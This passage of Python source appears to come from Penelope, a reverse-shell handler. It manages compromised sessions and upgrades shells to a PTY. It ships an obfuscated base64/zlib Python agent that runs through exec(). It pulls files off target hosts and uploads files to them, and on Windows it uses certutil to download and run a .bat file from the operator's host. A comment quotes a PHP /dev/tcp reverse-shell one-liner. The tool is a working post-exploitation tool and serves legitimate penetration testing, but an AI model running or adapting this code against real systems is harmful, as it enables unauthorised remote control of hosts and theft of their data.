					self.win_version = win_version[1]

			elif f"The term '{var_name1}={var_value1}' is not recognized as the name of a cmdlet" in response or \
					re.search('PS.*>', response, re.DOTALL):
				self.OS = 'Windows'
				self.type = 'Basic'
				self.subtype = 'psh'
				self.interactive = True
				self.echoing = False
				self.prompt = response.splitlines()[-1].encode()

		else: #TODO check if it is needed
			def expect(data):
				try:
					data = data.decode()
				except:
					return False
				if var_value1 + var_value2 in data:
					return True

			response = self.exec(
				f"${var_name1}='{var_value1}'; ${var_name2}='{var_value2}'; echo ${var_name1}${var_name2}\r\n",
				raw=True,
				expect_func=expect
			)
			if not response:
				return False
			response = response.decode()

			if var_value1 + var_value2 in response:
				self.OS = 'Windows'
				self.type = 'Basic'
				self.subtype = 'psh'
				self.interactive = not var_value1 + var_value2 == response
				self.echoing = False
				self.prompt = response.splitlines()[-1].encode()
				if var_name1 in response and not f"echo ${var_name1}${var_name2}" in response:
					self.type = 'PTY'
					columns, lines = shutil.get_terminal_size()
					cmd = (
						f"$width={columns}; $height={lines}; "
						"$Host.UI.RawUI.BufferSize = New-Object Management.Automation.Host.Size ($width, $height); "
						"$Host.UI.RawUI.WindowSize = New-Object -TypeName System.Management.Automation.Host.Size "
						"-ArgumentList ($width, $height)"
					)
					self.exec(cmd)
					self.prompt = response.splitlines()[-2].encode()
				else:
					self.prompt = re.sub(var_value1.encode() + var_value2.encode(), b"", self.prompt)

		self.get_shell_info(silent=True)
		if self.tty:
			self.type = 'PTY'
		if self.type == 'PTY':
			self.pty_ready = True
		return True

	def exec(
		self,
		cmd=None, 		# The command line to run
		raw=False, 		# Delimiters
		value=False,		# Will use the output elsewhere?
		timeout=False,		# Timeout
		expect_func=None,	# Function that determines what to wait for in the response
		force_cmd=False,	# Execute cmd command from powershell
		separate=False,		# If true, send cmd via this method but receive with TLV method (agent)
					# --- Agent only args ---
		agent_typing=False,	# Simulate typing on shell
		python=False,		# Execute python command
		stdin_src=None,		# stdin stream source
		stdout_dst=None,	# stdout stream destination
		stderr_dst=None,	# stderr stream destination
		stdin_stream=None,	# stdin_stream object
		stdout_stream=None,	# stdout_stream object
		stderr_stream=None,	# stderr_stream object
		agent_control=None	# control queue
	):
		if caller() == 'session_end':
			value = True

		if self.agent and not agent_typing: # TODO environment will not be the same as shell
			if cmd:
				cmd = dedent(cmd)
				if value:
					buffer = io.BytesIO()
				timeout = options.short_timeout if value else None

				if not stdin_stream:
					stdin_stream = self.new_streamID
					if not stdin_stream:
						return
				if not stdout_stream:
					stdout_stream = self.new_streamID
					if not stdout_stream:
						return
				if not stderr_stream:
					stderr_stream = self.new_streamID
					if not stderr_stream:
						return

				_type = 'S'.encode() if not python else 'P'.encode()
				self.send(Messenger.message(
					Messenger.EXEC, _type +
					stdin_stream.id +
					stdout_stream.id +
					stderr_stream.id +
					cmd.encode()
				))
				logger.debug(cmd)
				#print(stdin_stream.id, stdout_stream.id, stderr_stream.id)

				rlist = []
				if stdin_src:
					rlist.append(stdin_src)
				if stdout_dst or value:
					rlist.append(stdout_stream)
				if stderr_dst or value:
					rlist.append(stderr_stream) # FIX
				if not rlist:
					return True

				#rlist = [self.subchannel.control, stdout_stream, stderr_stream]
				#if stdin_src:
				#	rlist.append(stdin_src)

				if not agent_control:
					agent_control = self.subchannel.control # TEMP
				rlist.append(agent_control)
				while rlist != [agent_control]:
					r, _, _ = select(rlist, [], [], timeout)
					timeout = None

					if not r:
						#stdin_stream.terminate()
						#stdout_stream.terminate()
						#stderr_stream.terminate()
						break # TODO need to clear everything first

					for readable in r:

						if readable is agent_control:
							command = agent_control.get()
							if command == 'stop':
								# TODO kill task here...
								break

						if readable is stdin_src:
							if hasattr(stdin_src, 'read'): # FIX
								data = stdin_src.read(options.network_buffer_size)
							elif hasattr(stdin_src, 'recv'):
								try:
									data = stdin_src.recv(options.network_buffer_size)
								except OSError:
									pass # TEEEEMP
							stdin_stream.write(data)
							if not data:
								#stdin_stream << b""
								rlist.remove(stdin_src)

						if readable is stdout_stream:
							data = readable.read(options.network_buffer_size)
							if value:
								buffer.write(data)
							elif stdout_dst:
								if hasattr(stdout_dst, 'write'): # FIX
									stdout_dst.write(data)
									stdout_dst.flush()
								elif hasattr(stdout_dst, 'sendall'):
									try:
										stdout_dst.sendall(data) # maybe broken pipe
										if not data:
											if stdout_dst in rlist:
												rlist.remove(stdout_dst)
									except:
										if stdout_dst in rlist:
											rlist.remove(stdout_dst)
							if not data:
								rlist.remove(readable)
								del self.streams[readable.id]

						if readable is stderr_stream:
							data = readable.read(options.network_buffer_size)
							if value:
								buffer.write(data)
							elif stderr_dst:
								if hasattr(stderr_dst, 'write'): # FIX
									stderr_dst.write(data)
									stderr_dst.flush()
								elif hasattr(stderr_dst, 'sendall'):
									try:
										stderr_dst.sendall(data) # maybe broken pipe
										if not data:
											if stderr_dst in rlist:
												rlist.remove(stderr_dst)
									except:
										if stderr_dst in rlist:
											rlist.remove(stderr_dst)
							if not data:
								rlist.remove(readable)
								del self.streams[readable.id]
					else:
						continue
					break

				stdin_stream << b"" # TOCHECK
				stdin_stream.write(b"")
				os.close(stdin_stream._read)
				del self.streams[stdin_stream.id]

				return buffer.getvalue().rstrip().decode() if value else True
			return None

		with self.lock:
			if self.need_control_session:
				args = locals()
				del args['self']
				try:
					response = self.control_session.exec(**args)
					return response
				except AttributeError: # No control session
					logger.error("Spawn MANUALLY a new shell for this session to operate properly")
					return None

			if not self or not self.subchannel.can_use:
				logger.debug("Exec: The session is killed")
				return False

			self.subchannel.control.clear()
			self.subchannel.active = True
			self.subchannel.result = None
			buffer = io.BytesIO()
			_start = time.perf_counter()

			# Constructing the payload
			if cmd is not None:
				if force_cmd and self.subtype == 'psh':
					cmd = f"cmd /c '{cmd}'"
				initial_cmd = cmd
				cmd = cmd.encode()

				if raw:
					if self.OS == 'Unix':
						echoed_cmd_regex = rb' ' + re.escape(cmd) + rb'\r?\n'
						cmd = b' ' + cmd + b'\n'

					elif self.OS == 'Windows':
						cmd = cmd + b'\r\n'
						echoed_cmd_regex = re.escape(cmd)
				else:
					token = [rand(10) for _ in range(4)]

					if self.OS == 'Unix':
						cmd = (
							f" {token[0]}={token[1]} {token[2]}={token[3]};"
							f"printf ${token[0]}${token[2]};"
							f"{cmd.decode()};"
							f"printf ${token[2]}${token[0]}\n".encode()
						)

					elif self.OS == 'Windows': # TODO fix logic
						if self.subtype == 'cmd':
							cmd = (
								f"set {token[0]}={token[1]}&set {token[2]}={token[3]}\r\n"
								f"echo %{token[0]}%%{token[2]}%&{cmd.decode()}&"
								f"echo %{token[2]}%%{token[0]}%\r\n".encode()
							)
						elif self.subtype == 'psh':
							cmd = (
								f"$env:{token[0]}=\"{token[1]}\";$env:{token[2]}=\"{token[3]}\"\r\n"
								f"echo $env:{token[0]}$env:{token[2]};{cmd.decode()};"
								f"echo $env:{token[2]}$env:{token[0]}\r\n".encode()
							)
						# TODO check the maxlength on powershell
						if self.subtype == 'cmd' and len(cmd) > MAX_CMD_PROMPT_LEN:
							logger.error(f"Max cmd prompt length: {MAX_CMD_PROMPT_LEN} characters")
							return False

					self.subchannel.pattern = re.compile(
						rf"{token[1]}{token[3]}(.*){token[3]}{token[1]}"
						rf"{'.' if self.interactive else ''}".encode(), re.DOTALL)

				logger.debug(f"\n\n{paint(f'Command for session {self.id}').YELLOW}: {initial_cmd}")
				logger.debug(f"{paint('Command sent').yellow}: {cmd.decode()}")
				if self.agent and agent_typing:
					cmd = Messenger.message(Messenger.SHELL, cmd)
				self.send(cmd)
				self.subchannel.allow_receive_shell_data = False # TODO

			data_timeout = options.short_timeout if timeout is False else timeout
			continuation_timeout = options.latency
			timeout = data_timeout

			last_data = time.perf_counter()
			need_check = False
			try:
				while self.subchannel.result is None:
					logger.debug(paint(f"Waiting for data (timeout={timeout})...").blue)
					readables, _, _ = select([self.subchannel.control, self.subchannel], [], [], timeout)

					if self.subchannel.control in readables:
						command = self.subchannel.control.get()
						logger.debug(f"Subchannel Control Queue: {command}")

						if command == 'stop':
							self.subchannel.result = False
							break

					if self.subchannel in readables:
						logger.debug(f"Latency: {time.perf_counter() - last_data}")
						last_data = time.perf_counter()

						data = self.subchannel.read()
						buffer.write(data)
						logger.debug(f"{paint('Received').GREEN} -> {data}")

						if timeout == data_timeout:
							timeout = continuation_timeout
							need_check = True

					else:
						if timeout == data_timeout:
							logger.debug(paint("TIMEOUT").RED)
							self.subchannel.result = False
							break
						else:
							need_check = True
							timeout = data_timeout

					if need_check:
						need_check = False

						if raw and self.echoing and cmd:
							result = buffer.getvalue()
							if re.search(echoed_cmd_regex + (b'.' if self.interactive else b''), result, re.DOTALL):
								self.subchannel.result = re.sub(echoed_cmd_regex, b'', result)
								break
							else:
								logger.debug("The echoable is not exhausted")
								continue
						if not raw:
							check = self.subchannel.pattern.search(buffer.getvalue())
							if check:
								logger.debug(paint('Got all data!').green)
								self.subchannel.result = check[1]
								break
							logger.debug(paint('We didn\'t get all data; continue receiving').yellow)

						elif expect_func:
							if expect_func(buffer.getvalue()):
								logger.debug(paint("The expected strings found in data").yellow)
								self.subchannel.result = buffer.getvalue()
							else:
								logger.debug(paint('No expected strings found in data. Receive again...').yellow)

						else:
							logger.debug(paint('Maybe got all data !?').yellow)
							self.subchannel.result = buffer.getvalue()
							break
			except:
				self.subchannel.can_use = False
				self.subchannel.result = False

			_stop = time.perf_counter()
			logger.debug(f"{paint('FINAL TIME: ').white_BLUE}{_stop - _start}")

			if value and self.subchannel.result is not False:
				self.subchannel.result = self.subchannel.result.strip().decode() # TODO check strip
			logger.debug(f"{paint('FINAL RESPONSE: ').white_BLUE}{self.subchannel.result}")
			self.subchannel.active = False

			if separate and self.subchannel.result:
				self.subchannel.result = re.search(rb"..\x01.*", self.subchannel.result, re.DOTALL)[0]
				buffer = io.BytesIO()
				for _type, _value in self.messenger.feed(self.subchannel.result):
					buffer.write(_value)
				return buffer.getvalue()

			return self.subchannel.result

	def need_binary(self, name, url):
		options = (
			f"\n  1) Upload {paint(url).blue}{paint().magenta}"
			f"\n  2) Upload local {name} binary"
			f"\n  3) Specify remote {name} binary path"
			 "\n  4) None of the above\n"
		)
		print(paint(options).magenta)
		answer = ask("Select action: ")

		if answer == "1":
			return self.upload(
				url,
				remote_path="/var/tmp",
				randomize_fname=False
			)[0]

		elif answer == "2":
			local_path = ask(f"Enter {name} local path: ")
			if local_path:
				if os.path.exists(local_path):
					return self.upload(
						local_path,
						remote_path=self.tmp,
						randomize_fname=False
					)[0]
				else:
					logger.error("The local path does not exist...")

		elif answer == "3":
			remote_path = ask(f"Enter {name} remote path: ")
			if remote_path:
				if not self.exec(f"test -f {remote_path} || echo x"):
					return remote_path
				else:
					logger.error("The remote path does not exist...")

		elif answer == "4":
			return False

		return self.need_binary(name, url)

	def upgrade(self):
		self.upgrade_attempted = True
		if self.OS == "Unix":
			if self.agent:
				logger.warning("Python Agent is already deployed")
				return False

			if self.host_needs_control_session and self.host_control_sessions == [self]:
				logger.warning("This is a control session and cannot be upgraded")
				return False

			if self.pty_ready:
				if self.can_deploy_agent:
					logger.info("Attempting to deploy Python Agent...")
				else:
					logger.warning("This shell is already PTY")
			else:
				logger.info("Attempting to upgrade shell to PTY...")

			self.shell = self.bin['bash'] or self.bin['sh']
			if not self.shell:
				logger.warning("Cannot detect shell. Abort upgrading...")
				return False

			if self.can_deploy_agent:
				_bin = self.bin['python3'] or self.bin['python']
				if self.remote_python_version >= (3,):
					_decode = 'b64decode'
					_exec = 'exec(cmd, globals(), locals())'
				else:
					_decode = 'decodestring'
					_exec = 'exec cmd in globals(), locals()'

				agent = dedent('\n'.join(AGENT.splitlines()[1:])).format(
					self.shell,
					options.network_buffer_size,
					MESSENGER,
					STREAM,
					self.bin['sh'] or self.bin['bash'],
					_exec
				)
				payload = base64.b64encode(compress(agent.encode(), 9)).decode()
				cmd = f'{_bin} -Wignore -c \'import base64,zlib;exec(zlib.decompress(base64.{_decode}("{payload}")))\''

			elif not self.pty_ready:
				socat_cmd = f"{{}} - exec:{self.shell},pty,stderr,setsid,sigint,sane;exit 0"
				if self.bin['script']:
					_bin = self.bin['script']
					cmd = f"{_bin} -q /dev/null; exit 0"

				elif self.bin['socat']:
					_bin = self.bin['socat']
					cmd = socat_cmd.format(_bin)

				else:
					_bin = "/var/tmp/socat"
					if not self.exec(f"test -f {_bin} || echo x"): # TODO maybe needs rstrip
						cmd = socat_cmd.format(_bin)
					else:
						logger.warning("Cannot upgrade shell with the available binaries...")
						socat_binary = self.need_binary("socat", URLS['socat'])
						if socat_binary:
							_bin = socat_binary
							cmd = socat_cmd.format(_bin)
						else:
							if readline:
								logger.info("Readline support enabled")
								self.readline = True
								self.type = 'Readline'
								return True
							else:
								logger.error("Falling back to basic shell support")
								return False

			if not self.can_deploy_agent and not self.spare_control_sessions:
				logger.warning("Python agent cannot be deployed. I need to maintain at least one basic session to handle the PTY")
				core.session_wait_host = self.name
				self.spawn()
				try:
					new_session = core.sessions[core.session_wait.get(timeout=options.short_timeout)]
					core.session_wait_host = None

				except queue.Empty:
					logger.error("Failed spawning new session")
					return False

				if self.pty_ready:
					return True

			if self.pty_ready:
				self.exec("stty -echo")
				self.echoing = False

			elif self.interactive:
				# Some shells are unstable in interactive mode
				# For example: <?php passthru("bash -i >& /dev/tcp/X.X.X.X/4444 0>&1"); ?>
				# Silently convert the shell to non-interactive before PTY upgrade.
				self.interactive = False
				self.echoing = True
				self.exec(f"exec {self.shell}", raw=True)
				self.echoing = False

			response = self.exec(
				f'export TERM=xterm-256color; export SHELL={self.shell}; {cmd}',
				separate=self.can_deploy_agent,
				expect_func=lambda data: not self.can_deploy_agent or b"\x01" in data,
				raw=True
			)
			if self.can_deploy_agent and not isinstance(response, bytes):
				logger.error("The shell became unresponsive. I am killing it, sorry... Next time I will not try to deploy agent")
				Path(self.directory / ".noagent").touch()
				self.kill()
				return False

			logger.info(f"Shell upgraded successfully using {paint(_bin).yellow}{paint().green}! 💪")

			self.agent = self.can_deploy_agent
			self.type = 'PTY'
			self.interactive = True
			self.echoing = True
			self.prompt = response

			self.get_shell_info()

			if _bin == self.bin['script']:
				self.exec("stty sane")

		elif self.OS == "Windows":
			if self.type != 'PTY':
				self.readline = True
				logger.info("Added readline support...")

		return True

	def update_pty_size(self):
		columns, lines = shutil.get_terminal_size()
		if self.OS == 'Unix':
			if self.agent:
				self.send(Messenger.message(Messenger.RESIZE, struct.pack("HH", lines, columns)))
			else: # TODO
				threading.Thread(
					target=self.exec,
					args=(f"stty rows {lines} columns {columns} < {self.tty}",),
					name="RESIZE"
				).start() #TEMP
		elif self.OS == 'Windows': # TODO
			pass

	def readline_loop(self):
		while core.attached_session == self:
			try:
				cmd = input("\033[s\033[u", self.histfile, options.histlength, None, "\t") # TODO
				if self.subtype == 'cmd':
					assert len(cmd) <= MAX_CMD_PROMPT_LEN
				#self.record(b"\n" + cmd.encode(), _input=True)

			except EOFError:
				self.detach()
				break
			except AssertionError:
				logger.error(f"Maximum prompt length is {MAX_CMD_PROMPT_LEN} characters. Current prompt is {len(cmd)}")
			else:
				self.send(cmd.encode() + b"\n")

	def attach(self):
		if threading.current_thread().name != 'Core':
			if self.new:
				upgrade_conditions = [
					not options.no_upgrade,
					not (self.need_control_session and self.host_control_sessions == [self]),
					not self.upgrade_attempted
				]
				if all(upgrade_conditions):
					self.upgrade()
				if self.prompt:
					self.record(self.prompt)
				self.new = False

			core.control << f'self.sessions[{self.id}].attach()'
			menu.active.clear() # Redundant but safeguard
			return True

		if core.attached_session is not None:
			return False

		if self.type == 'PTY':
			escape_key = options.escape['key']
		elif self.readline:
			escape_key = 'Ctrl-D'
		else:
			escape_key = 'Ctrl-C'

		logger.info(
			f"Interacting with session {paint('[' + str(self.id) + ']').red}"
			f"{paint(', Shell Type:').green} {paint(self.type).CYAN}{paint(', Menu key:').green} "
			f"{paint(escape_key).MAGENTA} "
		)

		if not options.no_log:
			logger.info(f"Logging to {paint(self.logpath).yellow_DIM} 📜")
		print(paint('─').DIM * shutil.get_terminal_size()[0])

		core.attached_session = self
		core.rlist.append(sys.stdin)

		stdout(bytes(self.last_lines))

		if self.type == 'PTY':
			tty.setraw(sys.stdin)
			os.kill(os.getpid(), signal.SIGWINCH)

		elif self.readline:
			threading.Thread(target=self.readline_loop).start()

		self._cwd = None
		return True

	def sync_cwd(self):
		self._cwd = None
		if self.agent:
			self.exec(f"os.chdir('{self.cwd}')", python=True, value=True)
		elif self.need_control_session:
			self.exec(f"cd {self.cwd}")

	def detach(self):
		if self and self.OS == 'Unix' and (self.agent or self.need_control_session):
			threading.Thread(target=self.sync_cwd).start()

		if threading.current_thread().name != 'Core':
			core.control << f'self.sessions[{self.id}].detach()'
			return

		if core.attached_session is None:
			return False

		core.wait_input = False
		core.attached_session = None
		core.rlist.remove(sys.stdin)

		if not self.type == 'Basic':
			termios.tcsetattr(sys.stdin, termios.TCSADRAIN, TTY_NORMAL)

		if self.id in core.sessions:
			print()
			logger.warning("Session detached ⇲")
			menu.set_id(self.id)
		else:
			if options.single_session and not core.sessions:
				core.stop()
				logger.info("Penelope exited due to Single Session mode")
				return
			menu.set_id(None)
		menu.show()

		return True

	def download(self, remote_items):
		# Initialization
		try:
			shlex.split(remote_items) # Early check for shlex errors
		except ValueError as e:
			logger.error(e)
			return []

		local_download_folder = self.directory / "downloads"
		try:
			local_download_folder.mkdir(parents=True, exist_ok=True)
		except Exception as e:
			logger.error(e)
			return []

		if self.OS == 'Unix':
			# Check for local available space
			available_bytes = shutil.disk_usage(local_download_folder).free
			if self.agent:
				block_size = os.statvfs(local_download_folder).f_frsize
				response = self.exec(f"{GET_GLOB_SIZE}"
					f"stdout_stream << str(get_glob_size({repr(remote_items)}, {block_size})).encode()",
					python=True,
					value=True
				)
				try:
					remote_size = int(float(response))
				except:
					logger.error(response)
					return []
			else:
				cmd = f"du -ck {remote_items}"
				response = self.exec(cmd, timeout=None, value=True)
				if not response:
					logger.error("Cannot determine remote size")
					return []
				#errors = [line[4:] for line in response.splitlines() if line.startswith('du: ')]
				#for error in errors:
				#	logger.error(error)
				remote_size = int(response.splitlines()[-1].split()[0]) * 1024

			need = remote_size - available_bytes

			if need > 0:
				logger.error(
					f"--- Not enough space to download... {paint('We need ').blue}"
					f"{paint().yellow}{need:,}{paint().blue} more bytes..."
				)
				return []

			# Packing and downloading
			if self.agent:
				stdin_stream = self.new_streamID
				stdout_stream = self.new_streamID
				stderr_stream = self.new_streamID

				if not all([stdout_stream, stderr_stream]):
					return

				code = fr"""
				from glob import glob
				normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))
				items = []
				for part in shlex.split({repr(remote_items)}):
					_items = glob(normalize_path(part))
					if _items:
						items.extend(_items)
					else:
						items.append(part)
				import tarfile
				if hasattr(tarfile, 'DEFAULT_FORMAT'):
					tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
				else:
					tarfile.TarFile.posix = True
				tar = tarfile.open(name="", mode='w|gz', fileobj=stdout_stream)
				def handle_exceptions(func):
					def inner(*args, **kwargs):
						try:
							func(*args, **kwargs)
						except:
							stderr_stream << (str(sys.exc_info()[1]) + '\n').encode()
					return inner
				tar.add = handle_exceptions(tar.add)
				for item in items:
					try:
						tar.add(os.path.abspath(item))
					except:
						stderr_stream << (str(sys.exc_info()[1]) + '\n').encode()
				tar.close()
				"""

				threading.Thread(target=self.exec, args=(code, ), kwargs={
					'python': True,
					'stdin_stream': stdin_stream,
					'stdout_stream': stdout_stream,
					'stderr_stream': stderr_stream
				}).start()

				error_buffer = ''
				while True:
					r, _, _ = select([stderr_stream], [], [])
					data = stderr_stream.read(options.network_buffer_size)
					if data:
						error_buffer += data.decode()
						while '\n' in error_buffer:
							line, error_buffer = error_buffer.split('\n', 1)
							logger.error(str(paint("<REMOTE>").cyan) + " " + str(paint(line).red))
					else:
						break

				tar_source, mode = stdout_stream, "r|gz"
			else:
				remote_items = ' '.join([os.path.join(self.cwd, part) for part in shlex.split(remote_items)])
				temp = self.tmp + "/" + rand(8)
				cmd = rf'tar -czf - -h {remote_items}|base64|tr -d "\n" > {temp}'
				response = self.exec(cmd, timeout=None, value=True)
				if response is False:
					logger.error("Cannot create archive")
					return []
				errors = [line[5:] for line in response.splitlines() if line.startswith('tar: /')]
				for error in errors:
					logger.error(error)
				send_size = int(self.exec(rf"(stat -x {temp} 2>/dev/null || stat {temp}) | sed -n 's/.*Size: \([0-9]*\).*/\1/p'"))

				b64data = io.BytesIO()
				for offset in range(0, send_size, options.download_chunk_size):
					response = self.exec(f"cut -c{offset + 1}-{offset + options.download_chunk_size} {temp}")
					if response is False:
						logger.error("Download interrupted")
						return []
					b64data.write(response)
				self.exec(f"rm {temp}")

				data = io.BytesIO()
				data.write(base64.b64decode(b64data.getvalue()))
				data.seek(0)

				tar_source, mode = data, "r:gz"

			#print(remote_size)
			#if not remote_size:
			#	return []

			# Local extraction
			try:
				tar = tarfile.open(mode=mode, fileobj=tar_source)
			except:
				logger.error("Invalid data returned")
				return []

			def add_w(func):
				def inner(*args, **kwargs):
					args[0].mode |= 0o200
					func(*args, **kwargs)
				return inner

			tar._extract_member = add_w(tar._extract_member)

			with warnings.catch_warnings():
				warnings.simplefilter("ignore", category=DeprecationWarning)
				try:
					tar.extractall(local_download_folder)
				except Exception as e:
					logger.error(str(paint("<LOCAL>").yellow) + " " + str(paint(e).red))
			tar.close()

			if self.agent:
				stdin_stream.write(b"")
				os.close(stdin_stream._read)
				os.close(stdin_stream._write)
				del self.streams[stdin_stream.id]
				os.close(stdout_stream._read)
				del self.streams[stdout_stream.id]
				del self.streams[stderr_stream.id]

				# Get the remote absolute paths
				response = self.exec(f"""
				from glob import glob
				normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))
				remote_paths = ''
				for part in shlex.split({repr(remote_items)}):
					result = glob(normalize_path(part))
					if result:
						for item in result:
							if os.path.exists(item):
								remote_paths += os.path.abspath(item) + "\\n"
					else:
						remote_paths += part + "\\n"
				stdout_stream << remote_paths.encode()
				""", python=True, value=True)
			else:
				cmd = f'for file in {remote_items}; do if [ -e "$file" ]; then readlink -f "$file"; else echo "$file"; fi; done'
				response = self.exec(cmd, timeout=None, value=True)
				if not response:
					logger.error("Cannot get remote paths")
					return []

			remote_paths = response.splitlines()

			# Present the downloads
			downloaded = []
			for path in remote_paths:
				local_path = local_download_folder / path[1:]
				if os.path.isabs(path) and os.path.exists(local_path):
					downloaded.append(local_path)
				else:
					logger.error(f"{paint('Download Failed').RED_white} {shlex.quote(path)}")

		elif self.OS == 'Windows':
			remote_tempfile = f"{self.tmp}\\{rand(10)}.zip"
			tempfile_bat = f'/dev/shm/{rand(16)}.bat'
			remote_items_ps = r'\", \"'.join(shlex.split(remote_items))
			cmd = (
				f'@powershell -command "$archivepath=\'{remote_tempfile}\';compress-archive -path \'{remote_items_ps}\''
				' -DestinationPath $archivepath;'
				'$b64=[Convert]::ToBase64String([IO.File]::ReadAllBytes($archivepath));'
				'Remove-Item $archivepath;'
				'Write-Host $b64"'
			)
			with open(tempfile_bat, "w") as f:
				f.write(cmd)

			server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
			urlpath_bat = server.add(tempfile_bat)
			temp_remote_file_bat = urlpath_bat.split("/")[-1]
			server.start()
			data = self.exec(
				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" '
				f'"%TEMP%\\{temp_remote_file_bat}" >NUL 2>&1&"%TEMP%\\{temp_remote_file_bat}"&'
				f'del "%TEMP%\\{temp_remote_file_bat}"',
				force_cmd=True, value=True, timeout=None)
			server.stop()

			if not data:
				return []
			downloaded = set()
			try:
				with zipfile.ZipFile(io.BytesIO(base64.b64decode(data)), 'r') as zipdata:
					for item in zipdata.infolist():
						item.filename = item.filename.replace('\\', '/')
						downloaded.add(Path(local_download_folder) / Path(item.filename.split('/')[0]))
						newpath = Path(zipdata.extract(item, path=local_download_folder))

			except zipfile.BadZipFile:
				logger.error("Invalid zip format")

			except binascii_error:
				logger.error("The item does not exist or access is denied")

		for item in downloaded:
			logger.info(f"{paint('Download OK').GREEN_white} {paint(shlex.quote(pathlink(item))).yellow}")

		return downloaded

	def upload(self, local_items, remote_path=None, randomize_fname=False):

		# Check remote permissions
		destination = remote_path or self.cwd
		try:
			if self.OS == 'Unix':
				if self.agent:
					if not eval(self.exec(
						f"stdout_stream << str(os.access('{destination}', os.W_OK)).encode()",
						python=True,
						value=True
					)):
						logger.error(f"{destination}: Permission denied")
						return []
				else:
					if int(self.exec(f"[ -w \"{destination}\" ];echo $?", value=True)):
						logger.error(f"{destination}: Permission denied")
						return []
			elif self.OS == 'Windows':
				pass # TODO
		except Exception as e:
			logger.error(e)
			logger.warning("Cannot check remote permissions. Aborting...")
			return []

		# Initialization
		try:
			local_items = [item if re.match(r'(http|ftp)s?://', item, re.IGNORECASE)\
				 else normalize_path(item) for item in shlex.split(local_items)]

		except ValueError as e:
			logger.error(e)
			return []

		# Check for necessary binaries
		if self.OS == 'Unix' and not self.agent:
			dependencies = ['echo', 'base64', 'tar', 'rm']
			for binary in dependencies:
				if not self.bin[binary]:
					logger.error(f"'{binary}' binary is not available at the target. Cannot upload...")
					return []

		# Resolve items
		resolved_items = []
		for item in local_items:
			# Download URL
			if re.match(r'(http|ftp)s?://', item, re.IGNORECASE):
				try:
					filename, item = url_to_bytes(item)
					if not item:
						continue
					resolved_items.append((filename, item))
				except Exception as e:
					logger.error(e)
			else:
				if os.path.isabs(item):
					items = list(Path('/').glob(item.lstrip('/')))
				else:
					items = list(Path().glob(item))
				if items:
					resolved_items.extend(items)
				else:
					logger.error(f"No such file or directory: {item}")

		if not resolved_items:
			return []

		if self.OS == 'Unix':
			# Get remote available space
			if self.agent:
				response = self.exec(f"""
				stats = os.statvfs('{destination}')
				stdout_stream << (str(stats.f_bavail) + ';' + str(stats.f_frsize)).encode()
				""", python=True, value=True)

				remote_available_blocks, remote_block_size = map(int, response.split(';'))
				remote_space = remote_available_blocks * remote_block_size
			else:
				remote_block_size = int(self.exec(rf'stat -c "%o" {destination} 2>/dev/null || stat -f "%k" {destination}', value=True))
				remote_space = int(self.exec(f"df -k {destination}|tail -1|awk '{{print $4}}'", value=True)) * 1024

			# Calculate local size
			local_size = 0
			for item in resolved_items:
				if isinstance(item, tuple):
					local_size += ceil(len(item[1]) / remote_block_size) * remote_block_size
				else:
					local_size += get_glob_size(str(item), remote_block_size)

			# Check required space
			need = local_size - remote_space
			if need > 0:
				logger.error(
					f"--- Not enough space on target... {paint('We need ').blue}"
					f"{paint().yellow}{need:,}{paint().blue} more bytes..."
				)
				return []

			# Start Uploading
			if self.agent:
				stdin_stream = self.new_streamID
				stdout_stream = self.new_streamID
				stderr_stream = self.new_streamID

				if not all([stdin_stream, stderr_stream]):
					return

				code = rf"""
				import tarfile
				if hasattr(tarfile, 'DEFAULT_FORMAT'):
					tarfile.DEFAULT_FORMAT = tarfile.PAX_FORMAT
				else:
					tarfile.TarFile.posix = True
				tar = tarfile.open(name='', mode='r|gz', fileobj=stdin_stream)
				tar.errorlevel = 1
				for item in tar:
					try:
						tar.extract(item, path='{destination}')
					except:
						stderr_stream << (str(sys.exc_info()[1]) + '\n').encode()
				tar.close()
				"""
				threading.Thread(target=self.exec, args=(code, ), kwargs={
					'python': True,
					'stdin_stream': stdin_stream,
					'stdout_stream': stdout_stream,
					'stderr_stream': stderr_stream
				}).start()

				tar_destination, mode = stdin_stream, "r|gz"
			else:
				tar_buffer = io.BytesIO()
				tar_destination, mode = tar_buffer, "r:gz"

			tar = tarfile.open(mode='w|gz', fileobj=tar_destination)

			def handle_exceptions(func):
				def inner(*args, **kwargs):
					try:
						func(*args, **kwargs)
					except Exception as e:
						logger.error(str(paint("<LOCAL>").yellow) + " " + str(paint(e).red))
				return inner
			tar.add = handle_exceptions(tar.add)

			altnames = []
			for item in resolved_items:
				if isinstance(item, tuple):
					filename, data = item

					if randomize_fname:
						filename = Path(filename)
						altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
					else:
						altname = filename

					file = tarfile.TarInfo(name=altname)
					file.size = len(data)
					file.mode = 0o770
					file.mtime = int(time.time())

					tar.addfile(file, io.BytesIO(data))
				else:
					altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
					tar.add(item, arcname=altname)
				altnames.append(altname)
			tar.close()

			if self.agent:
				stdin_stream.write(b"")
				error_buffer = ''
				while True:
					r, _, _ = select([stderr_stream], [], [])
					data = stderr_stream.read(options.network_buffer_size)
					if data:
						error_buffer += data.decode()
						while '\n' in error_buffer:
							line, error_buffer = error_buffer.split('\n', 1)
							logger.error(str(paint("<REMOTE>").cyan) + " " + str(paint(line).red))
					else:
						break
				os.close(stdin_stream._read)
				os.close(stdin_stream._write)
				os.close(stdout_stream._read)
				del self.streams[stdin_stream.id]
				del self.streams[stdout_stream.id]
				del self.streams[stderr_stream.id]

			else: # TODO
				tar_buffer.seek(0)
				data = base64.b64encode(tar_buffer.read()).decode()
				temp = self.tmp + "/" + rand(8)

				for chunk in chunks(data, options.upload_chunk_size):
					response = self.exec(f"printf {chunk} >> {temp}")
					if response is False:
						#progress_bar.terminate()
						logger.error("Upload interrupted")
						return [] # TODO
					#progress_bar.update(len(chunk))

				#logger.info(paint("--- Remote unpacking...").blue)
				dest = f"-C {remote_path}" if remote_path else ""
				cmd = f"base64 -d < {temp} | tar xz {dest} 2>&1; temp=$?"
				response = self.exec(cmd, value=True)
				exit_code = int(self.exec("echo $temp", value=True))
				self.exec(f"rm {temp}")
				if exit_code:
					logger.error(response)
					return [] # TODO

		elif self.OS == 'Windows':
			tempfile_zip = f'/dev/shm/{rand(16)}.zip'
